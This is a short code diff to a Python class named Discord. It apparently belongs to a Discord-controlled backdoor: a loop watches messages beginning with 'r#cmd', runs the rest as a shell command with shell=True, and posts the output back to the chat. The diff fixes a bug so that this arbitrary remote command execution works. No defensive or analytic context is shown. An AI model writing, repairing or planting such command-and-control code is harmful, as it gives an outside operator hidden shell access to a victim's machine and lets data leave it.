@@ -52,7 +52,7 @@ class Discord:
         while True:
             if self.message_content().startswith("r#cmd"):
                 cmd = self.message_content().strip("r#cmd ")
-                proc = subprocess.Popen([cmd.split()], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                proc = subprocess.Popen(cmd.split(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 self.send_message(f"```{proc.communicate()}```")
             time.sleep(0.5) 
 
